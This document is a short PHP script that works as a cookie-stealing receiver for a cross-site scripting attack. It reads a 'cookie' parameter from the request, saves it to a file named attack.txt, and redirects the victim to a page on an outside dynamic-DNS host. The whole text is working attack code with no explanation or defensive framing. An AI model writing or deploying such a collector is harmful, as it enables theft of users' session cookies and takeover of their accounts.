<?php
$cookie = $_GET[cookie];
$f = fopen("attack.txt", "w");
fwrite($f, $cookie);
fclose($f);
header('Location: http://rharnr777.iptime.org:20580/freeboard');


?>
